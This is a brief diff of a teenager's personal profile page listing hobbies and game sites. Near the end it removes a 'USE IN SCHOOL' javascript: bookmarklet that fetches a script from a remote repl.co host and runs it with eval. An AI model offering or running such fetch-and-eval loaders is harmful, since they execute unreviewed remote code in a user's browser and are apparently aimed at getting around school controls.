@@ -5,7 +5,7 @@ I like to use a variety of useful computer software and build beautiful blog.
 
 Talking about Personal Stuffs:
 
-I love haley <33
+
 Im 16
 My name is nolan
 I luvv purple
@@ -23,5 +23,4 @@ Favorite sites
        poki.com <-- game list
        crazygames.com <-- game list                   
        sammycheez <-- game list
-       USE IN SCHOOL!!!\
-       javascript:fetch('https://Nullify-20.garoikana.repl.co/main.js').then(r => r.text()).then(r => eval(r))
+       USE IN SCHOOL!!!
